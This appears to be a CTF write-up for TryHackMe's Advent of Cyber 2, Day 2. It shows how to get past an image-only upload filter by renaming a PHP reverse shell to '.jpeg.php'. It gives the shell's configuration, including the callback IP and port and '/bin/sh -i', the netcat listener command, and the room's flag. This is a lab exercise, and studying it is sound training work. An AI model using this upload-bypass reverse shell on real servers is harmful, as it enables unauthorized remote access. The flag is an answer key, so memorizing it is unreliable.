I"š<p>Itâ€™s a write-up about the room : <a href="https://tryhackme.com/room/adventofcyber2">Try Hack Me - Room : AdventOfCyber2</a></p>

<h1 id="day-2--the-elf-strikes-back-">Day 2 : The Elf Strikes Back !</h1>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>At the bottom of the dossier is a sticky note containing the following 
message:

    For Elf McEager:
    You have been assigned an ID number for your audit of the system: 
	ODIzODI5MTNiYmYw . Use this to gain access to the upload section of 
	the site.
    Good luck!
</pre></td></tr></tbody></table></code></pre></div></div>

<p>We deploy the machine, obtain the IP address : <code class="language-plaintext highlighter-rouge">10.10.4.190</code></p>

<h2 id="what-string-of-text-needs-adding-to-the-url-to-get-access-to-the-upload-page">What string of text needs adding to the URL to get access to the upload page?</h2>

<p>We navigate tot the displayed IP address inn our browser and access to the upload page by adding this string to the URL : 
<code class="language-plaintext highlighter-rouge">/?id=ODIzODI5MTNiYmYw</code> because our ID is ODIzODI5MTNiYmYw.</p>

<h2 id="what-type-of-file-is-accepted-by-the-site">What type of file is accepted by the site?</h2>
<p><code class="language-plaintext highlighter-rouge">&lt;input type="file" id="chooseFile" accept=".jpeg,.jpg,.png"&gt;</code>
<strong>image</strong></p>

<h2 id="now-we-have-to-bypass-the-filter-and-upload-a-reverse-shell">Now we have to bypass the filter and upload a reverse shell.</h2>

<ul>
  <li>In which directory are the uploaded files stored?</li>
</ul>

<p>We use the file <strong>php-reverse-shell.php</strong> and rename it <strong>php-reverse-shell.jpeg.php</strong>.
In this one, we put our IP OpenVPN address and the port where we want to listen :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre>set_time_limit (0);
$VERSION = "1.0";
$ip = '10.8.87.25';  // CHANGE THIS
$port = 443;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
</pre></td></tr></tbody></table></code></pre></div></div>

<p>We submit it in the website, and go on <code class="language-plaintext highlighter-rouge">http://10.10.4.190/uploads/</code> and find our file.<br />
So the uploaded files are stored in <strong>/uploads/</strong>.</p>

<h2 id="what-is-the-flag-in-varwwwflagtxt">What is the flag in /var/www/flag.txt?</h2>

<p>We listen our port with the command : <code class="language-plaintext highlighter-rouge">sudo nc -lvnp 443</code>
We launch our file in the directory <code class="language-plaintext highlighter-rouge">/uploads/</code> on the website. 
We can now execute shell command, so we do that below to find the flag :</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre>sh-4.4$ cat /var/www/flag.txt  
cat /var/www/flag.txt


==============================================================


You've reached the end of the Advent of Cyber, Day 2 -- hopefully you're enjoying yourself so far, and are learning lots! 
This is all from me, so I'm going to take the chance to thank the awesome @Vargnaar for his invaluable design lessons, without which the theming of the past two websites simply would not be the same. 


Have a flag -- you deserve it!
THM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh}


Good luck on your mission (and maybe I'll see y'all again on Christmas Eve)!
 --Muiri (@MuirlandOracle)


==============================================================
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The flag is <strong>THM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh}</strong>.</p>
:ET